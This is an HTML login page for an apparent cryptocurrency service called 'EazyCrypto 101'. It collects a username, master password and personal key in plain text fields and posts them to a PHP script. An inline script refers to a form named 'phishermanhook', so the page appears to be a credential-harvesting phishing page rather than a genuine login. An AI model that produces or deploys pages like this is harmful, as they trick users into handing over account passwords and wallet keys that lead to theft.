<!DOCTYPE html>
<html lang="en">
<style>
    body {
    background-image: url("./img/Cryptocurrency Image.jpg");
    background-size: cover;
    }

    .logo {
        max-width: 250px;
        border-radius: 10px;
        border-width: 2px;
        border-color: black;
        background-color: white;
    }

    .mainSection {
        padding-left: 20%;
        padding-top: 140px;
    }

    .formBox {
        border-color: black;
        border-radius: 10px;
        border-width: 2px;
        background-color: #e5e5e5;
        padding: 20px;
        max-width: 450px;
    }

    .generated-captcha {
        text-decoration: line-through;
        font-weight: bold;
        text-align: center;
        font-size: 20px;
        background-color: #ede7f6;
    }
</style>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="./image.js"></script>
</head>

<body onload="generateCaptcha()">
    <div class="mainSection">
        <div class='logo'>
            <H1><strong>EazyCrypto 101</strong></H1>
        </div>
        <div class="formBox">
            <h3>Login</h3>
            <form action="CryptoDB.php" method="post" id="captcha_code">
                <div>
                    <label for="Username">Username</label>
                    <input type="text" name="Username" id="Username" required>
                </div>
                <div>
                    <label for="MasterPassword">Password</label>
                    <input type="text" name="MasterPassword" id="MasterPassword" required>
                </div>
                <div>
                    <label for="PersonalKey">Personal Key</label>
                    <input type="text" name="PersonalKey" id="PersonalKey" required>
                </div>
                <input type="submit" class="login">
                <!-- <input type="submit" name="submit"> -->
            </form>
        </div>
    </div>
<script>
    function onSubmit(token) {
        document.getElementById("phishermanhook").submit();
    }
</script>
</body>
</html>